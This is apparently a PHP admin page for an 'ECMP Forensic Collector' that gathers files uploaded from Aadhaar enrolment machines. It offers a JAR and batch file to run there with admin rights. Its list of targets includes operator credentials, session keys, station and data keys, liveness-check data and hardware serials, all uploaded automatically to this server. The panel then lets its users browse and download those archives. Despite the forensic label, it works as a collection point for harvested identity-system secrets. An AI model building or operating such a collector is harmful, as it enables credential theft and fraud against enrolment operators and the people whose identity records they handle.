<?php
$collections_dir = __DIR__ . '/collections/';
if (!is_dir($collections_dir)) mkdir($collections_dir, 0755, true);

// ─── AJAX Actions (header se pehle — redirect allow karne ke liye) ───────────
$action = $_GET['action'] ?? '';

if (in_array($action, ['list','browse','delete','download'])) {
    if(session_status() == PHP_SESSION_NONE) session_start();
    if(!isset($_SESSION['user_token'])){ http_response_code(403); echo json_encode(['error'=>'Unauthorized']); exit(); }

    if ($action === 'list') {
        header('Content-Type: application/json');
        $cols = [];
        foreach (glob($collections_dir . '*.zip') as $f) {
            $meta = file_exists($f.'.meta.json') ? json_decode(file_get_contents($f.'.meta.json'), true) : [];
            $cols[] = [
                'id'           => basename($f, '.zip'),
                'originalName' => $meta['originalName'] ?? basename($f),
                'uploadedAt'   => $meta['uploadedAt']   ?? date('c', filemtime($f)),
                'sizeBytes'    => filesize($f),
                'hostname'     => $meta['hostname']    ?? '',
                'username'     => $meta['username']    ?? '',
                'ipAddress'    => $meta['ipAddress']   ?? '',
                'ecmpPath'     => $meta['ecmpPath']    ?? '',
                'biosSerial'   => $meta['biosSerial']  ?? '',
                'fileCount'    => $meta['fileCount']   ?? 0,
            ];
        }
        usort($cols, fn($a,$b) => strcmp($b['uploadedAt'], $a['uploadedAt']));
        echo json_encode(['collections' => $cols]);
        exit();
    }

    if ($action === 'browse') {
        header('Content-Type: application/json');
        $id      = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['id'] ?? '');
        $zipfile = $collections_dir . $id . '.zip';
        if (!file_exists($zipfile)) { echo json_encode(['error'=>'Not found']); exit(); }
        $path = $_GET['path'] ?? '';
        $zip  = new ZipArchive();
        if ($zip->open($zipfile) !== true) { echo json_encode(['error'=>'Cannot open ZIP']); exit(); }
        if ($path !== '') {
            $content = $zip->getFromName($path);
            if ($content === false) { echo json_encode(['error'=>'File not in ZIP']); exit(); }
            $is_binary = !mb_check_encoding($content,'UTF-8') || preg_match('/[\x00-\x08\x0B\x0C\x0E-\x1F]/', $content);
            echo json_encode(['path'=>$path,'content'=>$is_binary?base64_encode($content):$content,'type'=>$is_binary?'binary':'text']);
            $zip->close(); exit();
        }
        $entries = [];
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $s = $zip->statIndex($i);
            $entries[] = ['name'=>$s['name'],'isDir'=>substr($s['name'],-1)==='/','size'=>$s['size'],'compressedSize'=>$s['comp_size']];
        }
        $zip->close();
        echo json_encode(['entries'=>$entries]);
        exit();
    }

    if ($action === 'delete' && $_SERVER['REQUEST_METHOD'] === 'POST') {
        header('Content-Type: application/json');
        $id = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['id'] ?? '');
        $z  = $collections_dir . $id . '.zip';
        if (file_exists($z))            unlink($z);
        if (file_exists($z.'.meta.json')) unlink($z.'.meta.json');
        echo json_encode(['ok'=>true]);
        exit();
    }

    if ($action === 'download') {
        $id = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['id'] ?? '');
        $z  = $collections_dir . $id . '.zip';
        if (!file_exists($z)) { http_response_code(404); exit('Not found'); }
        $meta  = json_decode(file_get_contents($z.'.meta.json') ?: '{}', true);
        $fname = $meta['originalName'] ?? basename($z);
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="'.addslashes($fname).'"');
        header('Content-Length: '.filesize($z));
        readfile($z);
        exit();
    }
}
// ─────────────────────────────────────────────────────────────────────────────

include('layout/header.php');
if(!isset($_SESSION['user_token'])){
    header("location:" . $basePath . "login.php");
    exit();
}
?>

<style>
.col-card { border:1px solid #dee2e6; border-radius:8px; margin-bottom:12px; background:#fff; overflow:hidden; }
.col-card-header { background:#f8f9fa; padding:12px 15px; border-bottom:1px solid #dee2e6; }
.entry-item { display:flex; align-items:center; justify-content:space-between; padding:4px 8px; border-radius:4px; font-family:monospace; font-size:12px; cursor:pointer; margin-bottom:2px; }
.entry-item:hover { background:#e9ecef; }
.entry-dir { background:#e8f4fd; color:#1a6fa6; cursor:default; }
.entry-important { background:#fff8e1; border:1px solid #ffc107; color:#856404; }
.entry-important:hover { background:#fff3cd; }
.file-content-box { background:#1e1e1e; color:#4ec9b0; font-family:monospace; font-size:11px; padding:12px; border-radius:6px; max-height:320px; overflow:auto; white-space:pre-wrap; word-break:break-all; }
.badge-bios { background:#6f42c1; color:#fff; font-size:10px; padding:2px 6px; border-radius:4px; display:inline-block; }
</style>

<div class="content" style="min-height:610px;">
<div class="animated fadeIn">
<div class="container-fluid">

<div class="row mb-3 mt-2">
    <div class="col-12 d-flex align-items-center justify-content-between flex-wrap" style="gap:10px;">
        <div>
            <h4 class="mb-0 font-weight-bold">
                <i class="fa fa-archive text-primary"></i> ECMP Forensic Collector
            </h4>
            <small class="text-muted">ECMP machine se conf/data/session/station/lvs/operator collect karke server par upload karo</small>
        </div>
        <button class="btn btn-sm btn-outline-secondary" onclick="loadCollections()">
            <i class="fa fa-refresh"></i> Refresh
        </button>
    </div>
</div>

<!-- JAR Download + Instructions -->
<div class="card mb-4" style="border:1px solid #2980b9;border-radius:10px;">
    <div class="card-header text-white" style="background:linear-gradient(135deg,#1a3a5c,#2980b9);border-radius:10px 10px 0 0;">
        <strong><i class="fa fa-download"></i> JAR Download + Instructions</strong>
    </div>
    <div class="card-body">
        <div class="d-flex flex-wrap mb-3" style="gap:10px;">
            <a href="downloads/EcmpCollector.jar" download class="btn btn-primary btn-sm font-weight-bold">
                <i class="fa fa-download"></i> EcmpCollector.jar v2.2
            </a>
            <a href="downloads/Run.bat" download class="btn btn-success btn-sm font-weight-bold">
                <i class="fa fa-download"></i> Run.bat Download
            </a>
        </div>

        <div class="p-3 rounded mb-3" style="background:#f8f9fa;border:1px solid #dee2e6;">
            <p class="mb-2 font-weight-bold"><i class="fa fa-list-ol text-warning"></i> ECMP Machine Par Kaise Chalayein:</p>
            <ol class="mb-0 pl-4">
                <li class="mb-1"><strong>EcmpCollector.jar</strong> aur <strong>Run.bat</strong> dono download karo</li>
                <li class="mb-1">Dono files ek folder mein rakho</li>
                <li class="mb-1"><strong class="text-success">Run.bat</strong> double-click karo — ECMP JRE auto-use hoga</li>
                <li class="mb-1">
                    <div class="p-2 rounded mt-1" style="background:#1e1e1e;font-family:monospace;font-size:11px;color:#4ec9b0;">
                        # Ya manually CMD se:<br>
                        "C:\UID Authority of India\Aadhaar Enrolment Client\jre\bin\java.exe" -jar EcmpCollector.jar
                    </div>
                    <small class="text-danger"><i class="fa fa-exclamation-triangle"></i> LVS ke liye Admin rights chahiye</small>
                </li>
                <li class="mb-1">Upload automatic ho jayega</li>
                <li>Yahan Refresh karo — collection neeche dikhegi</li>
            </ol>
        </div>

        <div class="p-3 rounded" style="background:#f8f9fa;border:1px solid #dee2e6;">
            <p class="mb-2 font-weight-bold"><i class="fa fa-folder-open text-warning"></i> Kya Collect Hoga (v2.2):</p>
            <table class="table table-sm table-borderless mb-1" style="font-size:13px;">
                <tbody>
                <?php
                $items = [
                    ['conf/',                    'userCredentials.xml, settings files'],
                    ['data/userCredentials.xml', 'Operator credentials (28 KB)'],
                    ['data/session/',            'Session keys (.dat files)'],
                    ['data/station/',            'key.json, registration.json, datakey.json'],
                    ['data/lvs/',                'LVS liveness data (qssitvs stop/start)'],
                    ['data/operators/',          'Operator sync details'],
                    ['_machine_info.txt',        'Hostname, BIOS serial, CPU, MAC, HDD serial'],
                ];
                foreach ($items as $item): ?>
                <tr>
                    <td style="font-family:monospace;color:#2980b9;white-space:nowrap;width:1%;"><?= htmlspecialchars($item[0]) ?></td>
                    <td class="text-muted">— <?= htmlspecialchars($item[1]) ?></td>
                </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
            <p class="mb-0 text-success small"><i class="fa fa-check-circle"></i> Derby DB aur archive folders skip honge</p>
        </div>
    </div>
</div>

<!-- Collections List -->
<div class="card" style="border-radius:10px;">
    <div class="card-header text-white d-flex align-items-center justify-content-between"
         style="background:linear-gradient(135deg,#1e3a2f,#27ae60);border-radius:10px 10px 0 0;">
        <strong><i class="fa fa-list"></i> Uploaded Collections
            <span id="col-count" class="badge badge-light ml-2">0</span>
        </strong>
    </div>
    <div class="card-body p-2">
        <div id="collections-area">
            <div class="text-center text-muted py-5">
                <i class="fa fa-spinner fa-spin fa-2x mb-2 d-block"></i>Loading...
            </div>
        </div>
    </div>
</div>

</div>
</div>
</div>

<?php include('layout/footer.php'); ?>

<script>
var allCollections = [];
var thisPage = 'ecmp_collector.php';

function esc(s){ var d=document.createElement('div'); d.textContent=s; return d.innerHTML; }
function fmtSize(b){ if(b<1024)return b+' B'; if(b<1048576)return (b/1024).toFixed(1)+' KB'; return (b/1048576).toFixed(2)+' MB'; }
function fmtDate(iso){ try{ return new Date(iso).toLocaleString('en-IN',{timeZone:'Asia/Kolkata'}); }catch(e){ return iso; } }

function loadCollections(){
    document.getElementById('collections-area').innerHTML =
        '<div class="text-center text-muted py-5"><i class="fa fa-spinner fa-spin fa-2x mb-2 d-block"></i>Loading...</div>';
    fetch(thisPage+'?action=list')
        .then(r => r.json())
        .then(d => { allCollections = d.collections||[]; renderCollections(); })
        .catch(() => {
            document.getElementById('collections-area').innerHTML =
                '<div class="alert alert-danger m-3">Load nahi ho saka. Refresh karo.</div>';
        });
}

function renderCollections(){
    var area = document.getElementById('collections-area');
    document.getElementById('col-count').textContent = allCollections.length;
    if(allCollections.length === 0){
        area.innerHTML = '<div class="text-center text-muted py-5">'
            +'<i class="fa fa-inbox fa-3x mb-3 d-block"></i>'
            +'<p>Abhi koi collection nahi</p>'
            +'<small>JAR chalao aur upload ho jayega</small></div>';
        return;
    }
    var html = '';
    allCollections.forEach(function(col){
        html += '<div class="col-card" id="card-'+esc(col.id)+'">'
            +'<div class="col-card-header">'
            +'<div class="d-flex align-items-start justify-content-between flex-wrap" style="gap:8px;">'
            +'<div>'
            +'<span class="font-weight-bold" style="font-family:monospace;font-size:13px;">'+esc(col.originalName)+'</span> '
            +'<span class="badge badge-success" style="font-size:10px;">&#10003; Uploaded</span>'
            +'<div class="mt-1" style="font-size:12px;color:#6c757d;">'
            +(col.hostname?'<span class="mr-3"><i class="fa fa-desktop"></i> '+esc(col.hostname)+'</span>':'')
            +(col.username?'<span class="mr-3"><i class="fa fa-user"></i> '+esc(col.username)+'</span>':'')
            +(col.ipAddress?'<span class="mr-3"><i class="fa fa-globe"></i> '+esc(col.ipAddress)+'</span>':'')
            +'<span class="mr-3"><i class="fa fa-clock-o"></i> '+fmtDate(col.uploadedAt)+'</span>'
            +'<span class="mr-3"><i class="fa fa-file-archive-o"></i> '+fmtSize(col.sizeBytes)+'</span>'
            +(col.fileCount?'<span><i class="fa fa-file"></i> '+col.fileCount+' files</span>':'')
            +'</div>'
            +(col.biosSerial?'<div class="mt-1"><span class="badge-bios"><i class="fa fa-microchip"></i> BIOS: '+esc(col.biosSerial)+'</span></div>':'')
            +(col.ecmpPath?'<div class="mt-1" style="font-size:11px;color:#2980b9;font-family:monospace;"><i class="fa fa-folder"></i> '+esc(col.ecmpPath)+'</div>':'')
            +'</div>'
            +'<div class="d-flex flex-wrap" style="gap:6px;flex-shrink:0;">'
            +'<a href="'+thisPage+'?action=download&id='+encodeURIComponent(col.id)+'" class="btn btn-sm btn-outline-success"><i class="fa fa-download"></i> Download</a>'
            +'<button class="btn btn-sm btn-outline-primary" onclick="toggleBrowse(\''+col.id+'\')"><i class="fa fa-search"></i> Browse</button>'
            +'<button class="btn btn-sm btn-outline-danger" onclick="confirmDelete(\''+col.id+'\')"><i class="fa fa-trash"></i></button>'
            +'</div>'
            +'</div>'
            +'</div>'
            +'<div id="browse-'+esc(col.id)+'" style="display:none;" class="p-3 border-top"></div>'
            +'</div>';
    });
    area.innerHTML = html;
}

function toggleBrowse(id){
    var panel = document.getElementById('browse-'+id);
    if(panel.style.display !== 'none'){ panel.style.display='none'; return; }
    panel.style.display = 'block';
    panel.innerHTML = '<div class="text-muted text-center py-3"><i class="fa fa-spinner fa-spin"></i> Loading ZIP...</div>';
    fetch(thisPage+'?action=browse&id='+encodeURIComponent(id))
        .then(r => r.json())
        .then(d => renderBrowse(id, d.entries||[]))
        .catch(() => { panel.innerHTML = '<div class="alert alert-danger">Browse nahi ho saka.</div>'; });
}

var importantFiles = ['_machine_info','userCredentials','session','station','operator','lvs','data'];

function renderBrowse(id, entries){
    var panel = document.getElementById('browse-'+id);
    var fi = '<div class="mb-2 d-flex" style="gap:6px;">'
        +'<input id="filter-'+id+'" class="form-control form-control-sm" placeholder="Filter files..." oninput="filterEntries(\''+id+'\')">'
        +'<button class="btn btn-sm btn-outline-secondary" onclick="document.getElementById(\'filter-'+id+'\').value=\'\';filterEntries(\''+id+'\')">Clear</button>'
        +'</div>';
    var li = '<div id="elist-'+id+'" style="max-height:300px;overflow-y:auto;">';
    entries.forEach(function(e){
        var imp = importantFiles.some(function(k){ return e.name.toLowerCase().includes(k); }) && !e.isDir;
        var cls = e.isDir ? 'entry-dir' : (imp ? 'entry-important' : '');
        var icon = e.isDir ? '<i class="fa fa-folder"></i>' : '<i class="fa fa-file-text-o"></i>';
        var sz  = e.isDir ? '' : '<span class="text-muted ml-2">'+fmtSize(e.size)+'</span>';
        var clk = e.isDir ? '' : 'onclick="readFile(\''+id+'\',\''+e.name.replace(/\\/g,'\\\\').replace(/'/g,"\\'")+'\')\"';
        li += '<div class="entry-item '+cls+'" data-name="'+esc(e.name)+'" '+clk+'>'+icon+' '+esc(e.name)+sz+'</div>';
    });
    li += '</div>';
    panel.innerHTML = fi+'<div class="row no-gutters" style="gap:12px;">'
        +'<div class="col">'+li+'</div>'
        +'<div class="col" id="fcontent-'+id+'"></div>'
        +'</div>';
}

function filterEntries(id){
    var val = document.getElementById('filter-'+id).value.toLowerCase();
    document.querySelectorAll('#elist-'+id+' .entry-item').forEach(function(el){
        el.style.display = !val || el.dataset.name.toLowerCase().includes(val) ? '' : 'none';
    });
}

function readFile(id, path){
    var fc = document.getElementById('fcontent-'+id);
    fc.innerHTML = '<div class="text-muted text-center py-3"><i class="fa fa-spinner fa-spin"></i></div>';
    fetch(thisPage+'?action=browse&id='+encodeURIComponent(id)+'&path='+encodeURIComponent(path))
        .then(r => r.json())
        .then(d => {
            var content = d.type==='binary'
                ? '[Binary file]\nBase64 (first 500 chars):\n'+d.content.substring(0,500)+'...'
                : d.content;
            fc.innerHTML = '<div class="d-flex align-items-center justify-content-between mb-1">'
                +'<small class="text-primary font-weight-bold" style="font-family:monospace;word-break:break-all;">'+esc(d.path)+'</small>'
                +'<button class="btn btn-sm btn-link text-muted p-0 ml-2" onclick="document.getElementById(\'fcontent-'+id+'\').innerHTML=\'\'">&#10005;</button>'
                +'</div>'
                +'<div class="file-content-box">'+esc(content)+'</div>';
        })
        .catch(() => { fc.innerHTML = '<div class="alert alert-danger">File read nahi ho saki.</div>'; });
}

function confirmDelete(id){
    if(!confirm('Is collection ko delete karo? Permanent hai!')) return;
    fetch(thisPage+'?action=delete', {method:'POST', body: new URLSearchParams({id:id})})
        .then(() => loadCollections())
        .catch(() => alert('Delete fail hua.'));
}

loadCollections();
</script>
